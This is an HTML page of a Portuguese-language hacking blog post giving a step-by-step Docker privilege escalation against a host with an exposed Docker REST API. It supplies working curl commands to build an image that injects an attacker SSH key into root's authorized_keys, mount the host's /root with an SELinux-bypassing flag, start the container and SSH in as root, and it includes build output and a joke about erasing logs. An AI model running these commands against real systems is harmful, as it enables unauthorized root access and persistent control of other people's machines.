<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title>docker privilege escalation [ method #2 ]</title><!-- Begin Jekyll SEO tag v2.6.1 -->
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="docker privilege escalation [ method #2 ]" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="vou escrever em portugues carioca pq nao qro pagar de fluente em 1ngl3s .. req - ler o primeiro post de priv escalation de docker, saber de docker, http, satanismo Vamos lembrar que existem MILHOES de maneiras de tu escalar priv em um container, vou mostrar so mais uma.. tecnica “antiga” ja, mas quando eu explorei pela primeira vez(2016) nao existia nenhum conteudo falando disso na net.. O role eh o mesmo de sempre, fuder a API do docker e levantar um container malicioso.(grandes merdas ne?) se quiser brisar em algo mais foda, leia a DOC do dockerAPI, foi la e somente de la q eu aprendi a fazer esta cagada.. No post anterior eu usei uma imagem dentro do dockerhub e precisei baixar na maquina alvo. Mas e quando a maquina n tem acesso a internet? (lembrando qtu pode usar essa tecnica pra rootar localmente uma maquina q esta escutando a porta REST API apenas localmente). Bom, existe uma caralhada de “E SE” e alguns tu so vai responder lendo DOC e codando um 0day do cu. Vamos ao que importa RESUMO: criar uma nova imagem apartir de uma existente no repo local e injetar ssh keys no volume compartilhado do root. 1 - tu precisa de uma imagem pra inicio de qualquer coisa.. vamo pegar a menor imagem q tenha dentro do repo local da maquina.. escolha qualquer uma ai http://trouxa:4243/images/json . tenta pegar a mais leve se possivel .. 2 - criar um Dockerfile FROM &lt;imagem&gt; USER root ENTRYPOINT echo &quot;PUBLIC-KEY&quot; &gt;&gt; /root/.ssh/authorized_keys salva como Dockerfile e manda pra um tarfile tar -cvf Docker.tar Dockerfile 3 - agora tu manda pro server ```bash $ curl -XPOST -H “content-type: application/x-tar” –data-binary @Docker.tar “http://trouxa/build”" />
<meta property="og:description" content="vou escrever em portugues carioca pq nao qro pagar de fluente em 1ngl3s .. req - ler o primeiro post de priv escalation de docker, saber de docker, http, satanismo Vamos lembrar que existem MILHOES de maneiras de tu escalar priv em um container, vou mostrar so mais uma.. tecnica “antiga” ja, mas quando eu explorei pela primeira vez(2016) nao existia nenhum conteudo falando disso na net.. O role eh o mesmo de sempre, fuder a API do docker e levantar um container malicioso.(grandes merdas ne?) se quiser brisar em algo mais foda, leia a DOC do dockerAPI, foi la e somente de la q eu aprendi a fazer esta cagada.. No post anterior eu usei uma imagem dentro do dockerhub e precisei baixar na maquina alvo. Mas e quando a maquina n tem acesso a internet? (lembrando qtu pode usar essa tecnica pra rootar localmente uma maquina q esta escutando a porta REST API apenas localmente). Bom, existe uma caralhada de “E SE” e alguns tu so vai responder lendo DOC e codando um 0day do cu. Vamos ao que importa RESUMO: criar uma nova imagem apartir de uma existente no repo local e injetar ssh keys no volume compartilhado do root. 1 - tu precisa de uma imagem pra inicio de qualquer coisa.. vamo pegar a menor imagem q tenha dentro do repo local da maquina.. escolha qualquer uma ai http://trouxa:4243/images/json . tenta pegar a mais leve se possivel .. 2 - criar um Dockerfile FROM &lt;imagem&gt; USER root ENTRYPOINT echo &quot;PUBLIC-KEY&quot; &gt;&gt; /root/.ssh/authorized_keys salva como Dockerfile e manda pra um tarfile tar -cvf Docker.tar Dockerfile 3 - agora tu manda pro server ```bash $ curl -XPOST -H “content-type: application/x-tar” –data-binary @Docker.tar “http://trouxa/build”" />
<link rel="canonical" href="http://localhost:4000/post/2017/12/15/docker-tar.html" />
<meta property="og:url" content="http://localhost:4000/post/2017/12/15/docker-tar.html" />
<meta property="og:site_name" content="pyperanger" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2017-12-15T03:00:00-02:00" />
<script type="application/ld+json">
{"description":"vou escrever em portugues carioca pq nao qro pagar de fluente em 1ngl3s .. req - ler o primeiro post de priv escalation de docker, saber de docker, http, satanismo Vamos lembrar que existem MILHOES de maneiras de tu escalar priv em um container, vou mostrar so mais uma.. tecnica “antiga” ja, mas quando eu explorei pela primeira vez(2016) nao existia nenhum conteudo falando disso na net.. O role eh o mesmo de sempre, fuder a API do docker e levantar um container malicioso.(grandes merdas ne?) se quiser brisar em algo mais foda, leia a DOC do dockerAPI, foi la e somente de la q eu aprendi a fazer esta cagada.. No post anterior eu usei uma imagem dentro do dockerhub e precisei baixar na maquina alvo. Mas e quando a maquina n tem acesso a internet? (lembrando qtu pode usar essa tecnica pra rootar localmente uma maquina q esta escutando a porta REST API apenas localmente). Bom, existe uma caralhada de “E SE” e alguns tu so vai responder lendo DOC e codando um 0day do cu. Vamos ao que importa RESUMO: criar uma nova imagem apartir de uma existente no repo local e injetar ssh keys no volume compartilhado do root. 1 - tu precisa de uma imagem pra inicio de qualquer coisa.. vamo pegar a menor imagem q tenha dentro do repo local da maquina.. escolha qualquer uma ai http://trouxa:4243/images/json . tenta pegar a mais leve se possivel .. 2 - criar um Dockerfile FROM &lt;imagem&gt; USER root ENTRYPOINT echo &quot;PUBLIC-KEY&quot; &gt;&gt; /root/.ssh/authorized_keys salva como Dockerfile e manda pra um tarfile tar -cvf Docker.tar Dockerfile 3 - agora tu manda pro server ```bash $ curl -XPOST -H “content-type: application/x-tar” –data-binary @Docker.tar “http://trouxa/build”","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/post/2017/12/15/docker-tar.html"},"@type":"BlogPosting","headline":"docker privilege escalation [ method #2 ]","dateModified":"2017-12-15T03:00:00-02:00","datePublished":"2017-12-15T03:00:00-02:00","url":"http://localhost:4000/post/2017/12/15/docker-tar.html","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
<body>
    <div class="container"><header>
  <div class="menu">
    <ul><li><a href="/">home</a></li><li><a href="/projects/">projects</a></li><li><a href="/about/">about</a></li></ul>
  </div>
</header>
<main>
      <p>vou escrever em portugues carioca pq nao qro pagar de fluente em 1ngl3s ..
<br />
req - ler o primeiro post de priv escalation de docker, saber de docker, http, satanismo
<br />
Vamos lembrar que existem MILHOES de maneiras de tu escalar priv em um container, vou mostrar so mais uma.. tecnica “antiga” ja, mas quando eu explorei pela primeira vez(2016) nao existia nenhum conteudo falando disso na net.. 
<br />
O role eh o mesmo de sempre, fuder a API do docker e levantar um container malicioso.(grandes merdas ne?) se quiser brisar em algo mais foda, leia a DOC do dockerAPI, foi la e somente de la q eu aprendi a fazer esta cagada.. 
<br />
No post anterior eu usei uma imagem dentro do dockerhub e precisei baixar na maquina alvo. Mas e quando a maquina n tem acesso a internet? (lembrando qtu pode usar essa tecnica pra rootar localmente uma maquina q esta escutando a porta REST API apenas localmente). Bom, existe uma caralhada de “E SE” e alguns tu so vai responder lendo DOC e codando um 0day do cu.
<br />
Vamos ao que importa
<br />
RESUMO: criar uma nova imagem apartir de uma existente no repo local e injetar ssh keys no volume compartilhado do root. 
<br />
1 - tu precisa de uma imagem pra inicio de qualquer coisa..
vamo pegar a menor imagem q tenha dentro do repo local da maquina.. 
escolha qualquer uma ai http://trouxa:4243/images/json . tenta pegar a mais leve se possivel .. 
<br />
2 - criar um Dockerfile</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>FROM &lt;imagem&gt;
USER root
ENTRYPOINT echo "PUBLIC-KEY" &gt;&gt; /root/.ssh/authorized_keys
</code></pre></div></div>
<p>salva como Dockerfile e manda pra um tarfile</p>
<ul>
  <li>tar -cvf Docker.tar Dockerfile
<br />
3 - agora tu manda pro server
```bash
$ curl -XPOST -H “content-type: application/x-tar” –data-binary @Docker.tar “http://trouxa/build”</li>
</ul>

<p>{“stream”: “Step 1: FROM some-minimal-image \ n”}
{“stream”: “— \ u003e 214bf35152ea \ n”}
{“stream”: “Step 2: user root \ n”}
{“stream”: “— \ u003e Running at 78af75a2b4d7 \ n”}
{“stream”: “— \ u003e 74d106dea791 \ n”}
{“stream”: “Removing the intermediate container 78af75a2b4d7 \ n”}
{“stream”: “Step 3: ENTRYPOINT echo " ssh-rsa MY_PUBLIC_KEY \ “\ u003e /root/.ssh/authorized_keys\n”}
{“stream”: “— \ u003e Running on bebcc4a6ba0f \ n”}
{“stream”: “— \ u003e 0470cc164544 \ n”}
{“stream”: “Removing the intermediate container bebcc4a6ba0f \ n”}
{“stream”: “0470cc164544 successfully built \ n”}</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;br&gt;
4 - configurar o container 
agora eh ajustar pra rolar o shared volume do /root/:/root/. nao esquecendo da flag 'z' que "bypassa" o SELINUX e outras limitacoes do Docker 
```bash
curl -H "Content-Type: application/json" -d '{"Image":"0470cc164544", "Binds": ["/root/:/root/:rw,z"]}' -XPOST "http://trouxa/containers/create"
</code></pre></div></div>
<p><br />
criou? papum agora
<br />
5 - granfinale 
agora eh so tu inciar o container e foi a merda feita..</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"http://trouxa/containers/&lt;container-id&gt;/start"</span> <span class="nt">-v</span>
...
ssh root@trouxa
</code></pre></div></div>
<p><br />
pronto.. ta feliz? nao esquece de apagar seus lo.. pera
<br />
ISSO EH PRA ESTUDO E DIVER..
<br />
  nao me respondabilizo pelo uso recreativo desse conteudo</p>


    </main><footer>
  random_evil_message()
</footer>
</div>
  </body>
</html>
